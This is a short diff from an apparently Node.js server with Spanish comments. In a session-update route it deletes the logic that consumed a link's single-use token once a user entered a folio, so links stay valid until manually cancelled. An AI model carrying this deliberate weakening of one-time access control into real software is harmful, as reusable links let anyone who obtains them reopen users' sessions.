@@ -1116,26 +1116,11 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
     try {
       const { id } = req.params;
       
-      // Obtener sesión actual antes de actualizar
-      const currentSession = await storage.getSessionById(id);
-      
       // Actualizar sesión
       const session = await storage.updateSession(id, req.body);
 
-      // Si el usuario ingresó el folio por primera vez: consumir token (sin timer, los links no expiran)
-      if (currentSession && !currentSession.hasUserData && session.hasUserData) {
-        try {
-          // Obtener el link asociado a esta sesión para consumir su token
-          const link = await linkTokenService.getLinkBySession(id);
-          if (link && link.token) {
-            // Consumir el token - ahora el link NO se puede volver a usar
-            await linkTokenService.consumeToken(link.token);
-            console.log(`[Links] Token ${link.token} consumido (usuario ingresó el folio)`);
-          }
-        } catch (error) {
-          console.error(`[Links] Error al consumir token para sesión ${id}:`, error);
-        }
-      }
+      // NO consumir token cuando se ingresa folio - los links nunca se invalidan automáticamente
+      // Solo se invalidan mediante cancelación manual
 
       // Notify all admin clients
       broadcastToAdmins(JSON.stringify({
